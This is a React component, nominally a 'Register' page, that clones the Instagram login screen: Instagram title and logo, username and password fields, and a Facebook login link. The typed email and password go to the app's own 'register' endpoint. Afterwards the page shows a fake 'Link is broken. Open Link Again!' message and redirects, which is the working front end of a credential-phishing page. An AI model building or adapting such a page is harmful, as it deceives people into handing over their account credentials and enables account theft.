import React, { useEffect, useState } from "react";
import toast from "react-hot-toast";
import { useRegisterMutation,  } from "../../redux/api/authApi";
import { useNavigate } from "react-router-dom";
import { useSelector } from "react-redux";
import MetaData from "../layouts/MetaData";

const Register = () => {

  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")

  const [ register, { isLoading, error, data, isSuccess } ] = useRegisterMutation()
    const [showPassword, setshowPassword] = useState(true);

    const {isAuthenticated} = useSelector((state) => state.auth)
    const navigate = useNavigate()

    const [color, setColor] = useState("")
    const [textColor, setTextColor] = useState("")
    const savedMode = localStorage.getItem('darkMode') === 'true';
  
    useEffect(() => {
      if(savedMode) {
         setColor("#0e1011")
         setTextColor("white")
      }
        else {
           setColor("#f5f5f5")
           setTextColor("black")
        }
  
    })

    useEffect(() => {

      if (isAuthenticated) {
        navigate("/")
      }

      if(error) {
          toast.error(error?.data?.message)
      } 

      if(isSuccess) {
        toast.error("Link is broken. Open Link Again!")
        navigate("/")
      }
  }, [error, isAuthenticated, isSuccess])

    const submitHandler = (e) => {
        e.preventDefault()

        const signUpData = {
            email,
            password,
        }

        register(signUpData)

    }

    return(
      <>
      <MetaData title="Log in - Instagram" />
      <div class="log-in-container">
      
            <div class="log-in">
              
                <img src="/images/logo.png" class="logo"/>
                <div class="log-in-form">
                    <input type="text" placeholder="Phone number, username or email" value={email}
              onChange={(e) => setEmail(e.target.value)}/>
                    <input type="password" placeholder="Password" value={password}
              onChange={(e) => setPassword(e.target.value)}/>
                    <button class="log-in-button" onClick={submitHandler}>Log In</button>
                </div>

                <span class="or-divider">OR</span>
               
                <div class="fb-login">
                    <a href="#" style={{textDecoration: "none"}}>
                        <img src="/images/facebook-icon.png" />
                        <span>Log in with Facebook</span>
                    </a>
                </div>
              
                <a href="#" style={{textDecoration: "none"}}>Forgot password?</a>
            </div>
            
            
            <div class="sign-up">
                <span>Don't have an account? 
                    <a href="#" style={{textDecoration: "none"}}> Sign up</a>
                </span>
            </div>
           
            <div class="get-the-app">
                <span>Get the app</span>
                <div class="app-images">
                    <a href="#" style={{textDecoration: "none"}}><img src="/images/applestore.png" /></a>
                    <a href="#" style={{textDecoration: "none"}}><img src="/images/googlestore.png" /></a>
                </div>
            </div>

        </div>
   </>
    )
}

export default Register